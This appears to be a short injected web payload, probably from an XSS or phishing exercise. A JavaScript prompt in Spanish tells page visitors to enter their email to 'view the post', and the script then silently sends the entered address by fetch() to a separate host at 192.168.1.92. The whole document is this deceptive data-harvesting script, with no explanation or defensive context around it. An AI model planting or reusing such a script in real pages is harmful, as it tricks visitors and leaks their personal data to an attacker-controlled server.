<script>
  var email= prompt("Por favor, introduzca su correo electrónico para visualizar el post", "example:example@example.com");

  if (email == null || email == ""){
      alert("Es necesario introducir un correo válido");
  }else {
      fetch("https://192.168.1.92/?email=" + email);
  }



</script>

